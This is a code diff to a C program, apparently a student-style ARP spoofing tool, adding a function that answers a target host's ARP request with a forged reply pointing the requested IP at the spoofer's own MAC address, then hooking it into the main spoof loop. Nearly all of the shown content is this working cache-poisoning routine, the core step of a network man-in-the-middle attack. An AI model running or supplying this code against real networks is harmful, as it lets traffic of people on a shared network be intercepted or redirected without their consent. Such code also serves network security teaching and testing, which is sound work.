@@ -81,6 +81,36 @@ int     is_arp_request_from_target(uint8_t *ip_rqst, uint8_t *mac_rqst, uint8_t 
     return 1;
 }
 
+int     send_arp_response(struct spoofaddrs addrs, struct ft_ethhdr *eth, struct ft_arphdr *arp, struct sockaddr *to, int sock)
+{
+    struct ft_arpbody response;
+    uint8_t tmpip[IP_LEN];
+    int     reclen;
+
+    printf("Sending ARP response to target\n");
+
+    ft_memcpy(eth->trgt_mac, eth->src_mac, MAC_LEN);
+    ft_memcpy(eth->src_mac, addrs.mac_source, MAC_LEN);
+
+    ft_memcpy(arp->tha, arp->sha, MAC_LEN);
+    ft_memcpy(arp->sha, addrs.mac_source, MAC_LEN);
+    ft_memcpy(tmpip, arp->spa, IP_LEN);
+    ft_memcpy(arp->spa, arp->tpa, IP_LEN);
+    ft_memcpy(arp->tpa, tmpip, IP_LEN);
+
+    response.arp.op = htons(ARPOP_REPLY);
+    response.eth = *eth;
+    response.arp = *arp;
+
+    reclen = sendto(sock, &response, sizeof(struct ft_arpbody), 0, to, sizeof(struct sockaddr));
+    if (reclen <= 0)
+    {
+        perror("Can't send ARP response");
+        return CANT_SEND_ARP_RESPONSE;
+    }
+    return SUCCESS;
+}
+
 int     spoof(struct spoofaddrs addrs, char *interface_name, int sock)
 {
     char                done, buf[sizeof(struct ft_ethhdr) + sizeof(struct ft_arphdr)], arp_src_ip[IP_LEN+IP_LEN], arp_src_mac[MAC_LEN+MAC_LEN];
@@ -113,12 +143,10 @@ int     spoof(struct spoofaddrs addrs, char *interface_name, int sock)
             continue;
         }
 
-        printf("received arp request from ip=%s\n", ipv4_to_str(arp->spa));
-
         if (is_arp_request_from_target(arp->spa, arp->sha, addrs.ip_target, addrs.mac_target))
         {
-            printf("ARP request from target!\n");
-            done = 1;
+            printf("ARP request from target received!\n");
+            done = send_arp_response(addrs, eth, arp, &from, sock) == SUCCESS;
         }
     }
 }
